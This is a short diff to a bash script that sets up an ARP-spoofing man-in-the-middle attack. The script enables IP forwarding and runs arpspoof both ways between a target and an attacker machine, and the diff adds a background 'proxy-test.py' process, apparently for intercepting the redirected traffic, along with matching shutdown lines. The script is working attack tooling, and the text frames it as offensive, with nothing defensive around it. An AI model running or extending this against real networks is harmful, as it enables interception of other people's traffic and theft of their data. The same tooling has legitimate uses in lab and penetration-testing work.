@@ -16,9 +16,11 @@ function end() {
   echo "Shutdown now..."
   kill $PID1
   kill $PID2
+  kill $PID3
   iptables -F
   wait $PID1
   wait $PID2
+  wait $PID3
 }
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -31,5 +33,8 @@ arpspoof -i $interface -t $target $attacker > arpspoof.log 2>&1 &
 PID1=$!
 arpspoof -i $interface -t $attacker $target > arpspoof.log 2>&1 &
 PID2=$!
+
+python3 proxy-test.py 2>&1 &
+PID3=$!
 
 cat
